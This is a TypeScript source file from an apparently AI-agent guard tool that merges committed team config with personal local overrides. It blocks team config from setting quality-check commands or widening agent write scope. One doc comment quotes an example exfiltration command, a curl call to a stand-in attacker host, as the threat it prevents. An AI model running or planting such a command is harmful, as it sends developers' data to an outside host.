// ===========================================
// Rules — Config Merging
// ===========================================
// Merges team config (`.interlinked/guard-rules.json`) and personal
// overrides (`.interlinked/guard-rules.local.json`) into the default
// config produced by `rules/default-config.ts`.
//
// Security note: team config is committed, so any arbitrary `command`
// field could silently execute on every developer's machine. We allow
// team config to toggle safe fields only — see applySafeQualityFields.

import { isJsonObject, type JsonObject } from "../../lib/json-types.js";
import { nonNull } from "../../lib/non-null.js";
import type { GuardRulesConfig, QualityCheckConfig } from "../types.js";
import { SECTION_DEFAULTS, type GuardRulesOverrides, type TeamRulesOverrides, type OptionalSectionKey, type ContentScannerOverrides } from "./config-overrides.js";
import { DEFAULT_CONFIG } from "./default-config.js";
import { isStringList } from "./parsed-rule.js";
import { readLocalQualityCheckOverride } from "./quality-check-overrides.js";

/**
 * `JSON.stringify`'s lib.d.ts return type is `string`, but that is a lie for
 * `undefined` / a function / a symbol — it returns `undefined` at runtime for
 * those. Cast the result back to its honest type so the `?? "undefined"`
 * fallback below is doing real work, not silencing a redundant condition.
 */
function safeJsonStringify(value: unknown): string {
	const stringified: string | undefined = JSON.stringify(value);
	return stringified ?? "undefined";
}

/**
 * Team config (git-committed) can toggle settings but CANNOT define
 * arbitrary commands. This prevents a malicious PR from adding a quality
 * check with "command": "curl https://attacker.com/exfil" that would
 * execute on every developer's machine.
 *
 * Specifically, team config can:
 *   - Add guard rules (pattern matching only, no command execution)
 *   - Add protected file rules
 *   - Toggle quality check enabled/file_types/severity/timeout_ms on EXISTING checks
 *   - Configure curl_mcp_detection, project_specific
 *
 * Team config CANNOT:
 *   - Set or change the `command` field on quality checks
 *   - Add new quality check entries with custom commands
 */
/**
 * Public API — consumed by `rules/loader.ts` via `loadRules()`.
 *
 * Merges team-level config into the default config. Mutates `config`
 * in place. Ignores dangerous fields like `command` on unknown checks.
 */
export function mergeTeamRules(config: GuardRulesConfig, team: TeamRulesOverrides): void {
	if (team.enabled === false) config.enabled = false;
	if (team.rules) config.rules = team.rules;
	if (team.protected_files) config.protected_files = team.protected_files;
	if (team.file_reminders) config.file_reminders = team.file_reminders;
	if (team.curl_mcp_detection) {
		Object.assign(config.curl_mcp_detection, team.curl_mcp_detection);
	}
	if (team.quality_checks) {
		applyTeamQualityCheckOverrides(config, team.quality_checks);
	}
	if (team.error_memory) {
		Object.assign(config.error_memory, team.error_memory);
	}
	if (team.project_specific) {
		config.project_specific = team.project_specific;
	}
	if (team.policy_classifier) {
		config.policy_classifier = team.policy_classifier;
	}
	if (team.auto_coordination) {
		config.auto_coordination = team.auto_coordination;
	}
	mergeOptionalSection(config, team, "project_wide_checks");
	// Grep-acceleration substitution toggle. Without this branch the flag the
	// pre-tool pipeline reads (`grep_acceleration.substitution_enabled`) was
	// silently dropped from team config — the documented re-enable path never
	// reached the daemon.
	if (team.grep_acceleration) {
		config.grep_acceleration = { ...config.grep_acceleration, ...team.grep_acceleration };
	}
	// Mutation-directed strict profile: a plain {enabled} boolean with no
	// command surface, so team config may set it. The committed
	// guard-rules.json carried this section while only the LOCAL merge honored
	// it (review 2026-08-29) — loadRules() returned undefined and the strict
	// profile silently never fired: the recurring "configured but unreachable"
	// class, proven to exist on the team side too. Pinned by the loadRules
	// filesystem test in mutation-directed-guard.team-config.test.ts.
	mergeOptionalSection(config, team, "mutation_directed_strict_profile");
	// Mode/wizard POSTURE sections (review 2026-08-30 P0): `interlinked mode`
	// and the setup wizard write these to the committed file, but the team
	// tier refused every one — three different modes wrote three different
	// JSONs that all LOADED identically. Only the whitelisted safe fields
	// (booleans + three known enum strings) pass; runtime/endpoint/number
	// knobs (budget_ms, timeouts) stay local-tier.
	applyTeamStructuralPosture(config, team);
	applyTeamBooleanPosture(config, team);
}

/** Enum-valued structural fields a mode/wizard legitimately sets, with their
 *  ONLY legal values (review 2026-08-30: field-name whitelisting alone let
 *  `test_first_mode: "typo"` into the runtime config). An invalid value is
 *  dropped — it never enters the loaded configuration. */
const TEAM_STRUCTURAL_BOOLEAN_FIELDS = new Set(
	Object.entries(DEFAULT_CONFIG.structural_checks).filter(([, value]) => typeof value === "boolean").map(([key]) => key),
);

const TEAM_STRUCTURAL_ENUM_VALUES: Record<string, ReadonlySet<string>> = {
	test_first_mode: new Set(["nudge", "warn", "enforce"]),
	characterize_mode: new Set(["block", "warn", "off"]),
	dead_code_action: new Set(["flag", "delete"]),
};

export interface PostureEnumViolation {
	field: string;
	/** JSON-rendered offending value — non-strings (7, null, [], {}) are as
	 *  invalid as a typo string and must be reported the same way. */
	value: string;
}

/** The REAL built-in posture per enum field. An invalid value is replaced
 *  with this — never merely deleted (review 2026-08-30 third pass: a deleted
 *  field read as `undefined`, and consumers applied their OWN fallbacks, so
 *  an invalid `test_first_mode` silently downgraded the built-in `enforce`
 *  to a consumer's `warn`). */
const POSTURE_ENUM_DEFAULTS: Record<string, string> = {
	test_first_mode: "enforce",
	characterize_mode: "warn",
	dead_code_action: "flag",
};

/** ONE pure validator over a RAW `structural_checks` value (a parsed config
 *  file's section, before any merge filtering). Shared by the loader's
 *  sanitize step and doctor — doctor must examine the raw FILE, because the
 *  team merge drops invalid values before they could be reported. */
export function postureEnumViolationsIn(rawStructural: unknown): PostureEnumViolation[] {
	if (rawStructural === null || typeof rawStructural !== "object" || Array.isArray(rawStructural)) {
		return [];
	}
	// SAFETY: the guard above leaves exactly a non-null, non-array object;
	// every field read below is individually type-checked.
	const section = rawStructural as Record<string, unknown>;
	const out: PostureEnumViolation[] = [];
	for (const [field, allowed] of Object.entries(TEAM_STRUCTURAL_ENUM_VALUES)) {
		if (!Object.hasOwn(section, field)) continue;
		const value = section[field];
		// A PRESENT field is invalid when it is not a string OR not an allowed
		// string (review 2026-08-30 fourth pass: 7 / null / [] / {} were
		// neither valid nor reported).
		if (typeof value !== "string" || !allowed.has(value)) {
			out.push({ field, value: safeJsonStringify(value) });
		}
	}
	return out;
}

/** The FINAL enum boundary (review 2026-08-30 second pass): the team merge
 *  filters values on the way in, but the LOCAL tier is trusted and merged
 *  wholesale — so `test_first_mode: "typo"` in guard-rules.local.json still
 *  reached the runtime config. Run after BOTH merges: an invalid value is
 *  REPLACED with the real built-in default (never deleted — see
 *  {@link POSTURE_ENUM_DEFAULTS}) and returned for reporting. */
export function sanitizePostureEnums(config: GuardRulesConfig): PostureEnumViolation[] {
	// SAFETY: structural_checks is a plain settings object; the writes below set
	// only whitelisted boolean/enum keys, preserving its declared shape.
	const target = config.structural_checks as unknown as Record<string, unknown>;
	const violations = postureEnumViolationsIn(target);
	for (const violation of violations) {
		target[violation.field] = POSTURE_ENUM_DEFAULTS[violation.field];
	}
	return violations;
}

/** structural_checks from team config: per-check boolean toggles (test_first,
 *  dead_imports, enabled, …) plus the three posture enums with validated
 *  values. A number here is a perf/runtime knob and never merges from the
 *  committed file. */
function applyTeamStructuralPosture(config: GuardRulesConfig, team: Pick<GuardRulesOverrides, "structural_checks">): void {
	const override = team.structural_checks;
	if (!override || typeof override !== "object") return;
	// SAFETY: structural_checks is a plain settings object; the writes below set
	// only whitelisted boolean/enum keys, preserving its declared shape.
	const target = config.structural_checks as unknown as Record<string, unknown>;
	for (const [key, value] of Object.entries(override)) {
		if (typeof value === "boolean" && TEAM_STRUCTURAL_BOOLEAN_FIELDS.has(key)) target[key] = value;
		else if (typeof value === "string" && TEAM_STRUCTURAL_ENUM_VALUES[key]?.has(value)) {
			target[key] = value;
		}
	}
}

/** The named boolean-only posture fields the team tier accepts per section.
 *  Everything else in these sections (budget_ms, block_on_*, thresholds)
 *  stays personal/local. */
const TEAM_BOOLEAN_SECTIONS = ["per_edit_coverage", "verification_stop_checks", "commit_cadence", "diff_aware"] as const;

function applyTeamBooleanPosture(config: GuardRulesConfig, team: Pick<GuardRulesOverrides, typeof TEAM_BOOLEAN_SECTIONS[number]>): void {
	for (const section of TEAM_BOOLEAN_SECTIONS) applyTeamEnabled(config, team[section], section);
	const coverage = team.per_edit_coverage;
	if (isJsonObject(coverage) && typeof coverage.debt_mode === "boolean" && config.per_edit_coverage) {
		config.per_edit_coverage.debt_mode = coverage.debt_mode;
	}
}

function applyTeamEnabled<K extends typeof TEAM_BOOLEAN_SECTIONS[number]>(
	config: Pick<GuardRulesConfig, K>, override: unknown, section: K,
): void {
	if (!isJsonObject(override)) return;
	const target = config[section] ?? structuredClone(SECTION_DEFAULTS[section]);
	if (typeof override.enabled === "boolean") target.enabled = override.enabled;
	config[section] = target;
}

/**
 * Public API — consumed by `rules/loader.ts` via `loadRules()`.
 *
 * Merges local (personal, gitignored) overrides into the config. Local
 * overrides are trusted because they live only on the developer's
 * machine, so they can set `command` fields and add new checks freely.
 */
export function mergeLocalOverrides(
	config: GuardRulesConfig,
	local: GuardRulesOverrides,
): void {
	if (local.disabled_rules) {
		config.disabled_rules = local.disabled_rules;
	}
	if (local.extra_exceptions) {
		config.extra_exceptions = local.extra_exceptions;
	}
	// Local can add personal file reminders (appended to team reminders)
	if (local.file_reminders) {
		config.file_reminders = [...config.file_reminders, ...local.file_reminders];
	}
	// Local can override quality checks (e.g., disable tsc on slow machines)
	if (local.quality_checks) {
		applyLocalQualityCheckOverrides(config, local.quality_checks);
	}
	// Local can override project-wide checks (e.g., disable on slow machines)
	mergeOptionalSection(config, local, "project_wide_checks");
	// Local can toggle the ML content scanner on/off and tweak individual
	// knobs. Nested blocks (`local`, `huggingface`, `custom_http`, `scan_points`)
	// are deep-merged so a partial override like `{local: {pool_size: 1}}`
	// keeps the default python_bin / sidecar_script / timeouts intact.
	// (A previous shallow `Object.assign` replaced whole nested objects and
	// silently dropped required defaults.)
	if (local.content_scanner) {
		config.content_scanner ??= structuredClone(nonNull(DEFAULT_CONFIG.content_scanner));
		mergeContentScanner(config.content_scanner, local.content_scanner);
	}
	// Local can disable / tune the structural-checks suite. Without this branch
	// `{structural_checks: {enabled: false}}` in guard-rules.local.json was
	// silently dropped, leaving the post-event budget at 17–38 s on Writes that
	// triggered the prompt-injection scanner alongside the structural pipeline.
	// Shallow Object.assign matches the content_scanner / project_wide_checks
	// pattern in this file — nested fields are leaf booleans / numbers with no
	// internal structure that needs deep-merge.
	if (local.structural_checks) {
		Object.assign(config.structural_checks, local.structural_checks);
	}
	// Plan-capture (PB&J Free-CLI item #2) — local can toggle the master
	// switch and the structured-userprompt parser flag.
	mergeOptionalSection(config, local, "plan_capture");
	// Git session-scope gate (PB&J Free-CLI item #7) — local can flip the
	// gate on/off and choose ask vs block mode.
	mergeOptionalSection(config, local, "git_session_scope_gate");
	mergeOptionalSection(config, local, "tsc_overlay");
	// Linked workspace roots — sibling project dirs the agent may also write to
	// (the multi-repo workspace model; see docs/design/linked-workspace.md).
	// LOCAL-ONLY by design: this WIDENS write-confinement, so it must be the
	// user's own explicit choice on their own machine — never settable via
	// committed team config (a PR adding linked_projects: ["/"] would widen
	// every developer's agent write scope). Not merged in mergeTeamRules.
	if (local.linked_projects) {
		config.linked_projects = local.linked_projects;
	}
	// Per-developer grep-acceleration toggle. This is the documented personal
	// re-enable path; without the branch the flag in guard-rules.local.json
	// reached neither merge function and was silently dropped.
	if (local.grep_acceleration) {
		config.grep_acceleration = { ...config.grep_acceleration, ...local.grep_acceleration };
	}
	// Per-edit coverage / red-green / CRAP gates. These are DEFAULT ON and the ONLY
	// documented opt-out is `{"per_edit_coverage": {"enabled": false}}` in
	// guard-rules.local.json (default-config.ts). Shallow-merged so a partial
	// `{enabled:false}` keeps the other knobs (mode / budget_ms / languages /
	// block_on_*).
	mergeOptionalSection(config, local, "per_edit_coverage");
	// Per-edit mutation gate (spec §12) — same silently-dropped bug class
	// (found live 2026-07-02 flipping the dogfood flag).
	mergeOptionalSection(config, local, "per_edit_mutation");
	// Trajectory-engine shadow mode (default ON) — FIFTH instance of the
	// silently-dropped class, caught by the merge-parity check as it was written.
	mergeOptionalSection(config, local, "trajectory_shadow");
	// Scratchpad write policy (block default) — the documented per-dev softening
	// path is `{"scratchpad_guard": {"code_write_mode": "warn"}}` in
	// guard-rules.local.json; classified at introduction so the override works
	// on day one.
	mergeOptionalSection(config, local, "scratchpad_guard");
	mergeOptionalSection(config, local, "spec_checks");
	// Edit-contract checks (LG-3/LG-4 warn/measure tiers) — classified at
	// introduction so `{"edit_contract": {"stale_read": "off"}}` in
	// guard-rules.local.json works on day one.
	mergeOptionalSection(config, local, "edit_contract");
	// verification_stop_checks: default-config documents "flip per-kind to
	// false in guard-rules.local.json", so the section MUST be locally
	// overridable (deep-round #4 — the switch was previously unreachable).
	mergeOptionalSection(config, local, "verification_stop_checks");
	// SessionEnd scratchpad archive (default ON) — local can disable or tune
	// the caps; shallow-merged so a partial override keeps the other knobs.
	mergeOptionalSection(config, local, "scratchpad_archive");
	// SessionEnd baseline auto-fold (default ON) — the documented opt-out is
	// `{"baseline_autofold": {"enabled": false}}` in guard-rules.local.json;
	// classified at introduction so the override works on day one.
	mergeOptionalSection(config, local, "baseline_autofold");
	// Mutation-directed file-class severity profile (default OFF) — classified
	// at introduction so a per-dev `{"mutation_directed_strict_profile":
	// {"enabled": true}}` opt-in in guard-rules.local.json works on day one,
	// same as every sibling flag added after the silently-dropped bug class
	// above was found.
	mergeOptionalSection(config, local, "mutation_directed_strict_profile");
	// `interlinked mode --local` writes its guard posture (incl. commit_cadence)
	// to guard-rules.local.json (2026-08-30); the section must merge locally or
	// the personal mode switch is the silently-dropped class again.
	mergeOptionalSection(config, local, "commit_cadence");
}

/**
 * Local config may change ANY field on a quality check and may add new check
 * entries — unlike team config, guard-rules.local.json is not attacker-reachable
 * via a PR. Extracted from `mergeLocalOverrides` (its deepest-nested block).
 */
function applyLocalQualityCheckOverrides(config: GuardRulesConfig, localQualityChecks: unknown): void {
	if (!isJsonObject(localQualityChecks)) return;
	for (const [key, raw] of Object.entries(localQualityChecks)) {
		const check = readLocalQualityCheckOverride(raw);
		if (check) applyLocalQualityCheck(config, key, check);
	}
}

function applyLocalQualityCheck(config: GuardRulesConfig, key: string, check: Partial<QualityCheckConfig>): void {
	const existing = Object.hasOwn(config.quality_checks, key) ? config.quality_checks[key] : undefined;
	if (existing) {
		Object.assign(existing, check);
		return;
	}
	const complete = completeQualityCheck(check);
	if (complete) Object.defineProperty(config.quality_checks, key, { value: complete, enumerable: true, writable: true, configurable: true });
}

function completeQualityCheck(check: Partial<QualityCheckConfig>): QualityCheckConfig | null {
	const { enabled, file_types, timeout_ms, severity } = check;
	if (enabled === undefined || file_types === undefined || timeout_ms === undefined || severity === undefined) return null;
	return { ...check, enabled, file_types, timeout_ms, severity };
}

/**
 * Team config can only toggle safe fields (see applySafeQualityFields) on
 * EXISTING quality-check entries — it can neither add new entries nor set a
 * `command` on one, since a committed config file is attacker-reachable via a
 * malicious PR. Extracted from `mergeTeamRules` (its deepest-nested block) so
 * the safe-field iteration reads as one unit answering "what may team config
 * change on this one existing check".
 */
function applyTeamQualityCheckOverrides(
	config: GuardRulesConfig,
	// Untyped on purpose: this is raw JSON.parse output from a committed file
	// (rules-loader.ts reads it with no schema validation), so the caller's
	// `Record<string, QualityCheckConfig>` field type is aspirational, not
	// verified — a hand-edited guard-rules.json can put anything here. The
	// `unknown` below is what makes the shape checks that follow real checks.
	teamQualityChecks: unknown,
): void {
	if (!isJsonObject(teamQualityChecks)) return;
	for (const [key, teamCheck] of Object.entries(teamQualityChecks)) {
		if (!Object.hasOwn(config.quality_checks, key)) continue;
		const existing = config.quality_checks[key];
		if (!existing) continue; // Team cannot add new check entries
		if (!isJsonObject(teamCheck)) continue;
		applySafeQualityFields(existing, teamCheck);
	}
}

function applySafeQualityFields(existing: QualityCheckConfig, override: JsonObject): void {
	if (typeof override.enabled === "boolean") existing.enabled = override.enabled;
	if (isStringList(override.file_types)) existing.file_types = override.file_types;
	if (typeof override.timeout_ms === "number" && Number.isFinite(override.timeout_ms)) {
		existing.timeout_ms = override.timeout_ms;
	}
	if (override.severity === "warning" || override.severity === "error") {
		existing.severity = override.severity;
	}
	if (typeof override.description === "string") existing.description = override.description;
}

/** Shallow-merge one optional config section: assign into the existing
 *  section, or clone its defaults before applying a supplied override. The
 *  shared shape of the recurring "key added to GuardRulesConfig but never
 *  merged" bug class — see the merge-parity test for the classification. */
function mergeOptionalSection<K extends OptionalSectionKey>(
	config: Pick<GuardRulesConfig, K>,
	local: Pick<GuardRulesOverrides, K>,
	key: K,
): void {
	const override = local[key];
	if (!override) return;
	const target = config[key] ?? structuredClone(SECTION_DEFAULTS[key]);
	config[key] = Object.assign(target, override);
}

/** Deep-merge overrides for the content scanner config. Nested blocks
 *  (local/huggingface/custom_http/scan_points) are field-merged so a
 *  partial override like `{local: {pool_size: 1}}` preserves the default
 *  python_bin / sidecar_script / timeouts. Scalar top-level knobs overwrite. */
function mergeContentScanner(
	target: NonNullable<GuardRulesConfig["content_scanner"]>,
	override: ContentScannerOverrides,
): void {
	if (override.enabled !== undefined) target.enabled = override.enabled;
	if (override.runtime !== undefined) target.runtime = override.runtime;
	if (override.min_score !== undefined) target.min_score = override.min_score;
	if (override.max_scan_bytes !== undefined) target.max_scan_bytes = override.max_scan_bytes;
	if (override.local) Object.assign(target.local, override.local);
	if (override.huggingface) Object.assign(target.huggingface, override.huggingface);
	if (override.custom_http) Object.assign(target.custom_http, override.custom_http);
	// Allowlist is APPENDED — locals add to defaults, never replace. This keeps
	// the curated team/default list in force while letting individuals add
	// machine-specific entries (their personal noreply addresses, project-
	// specific identifiers, etc.) in guard-rules.local.json.
	if (override.allowlist && override.allowlist.length > 0) {
		target.allowlist = [...(target.allowlist ?? []), ...override.allowlist];
	}
	// disabled_labels follows the same additive convention as allowlist: locals
	// append, never replace. De-duplicated on merge so a user re-naming the
	// same label in both layers doesn't double-count it in any audit output.
	if (override.disabled_labels && override.disabled_labels.length > 0) {
		const merged = new Set([...(target.disabled_labels ?? []), ...override.disabled_labels]);
		target.disabled_labels = [...merged];
	}
	if (override.scan_points) Object.assign(target.scan_points, override.scan_points);
}
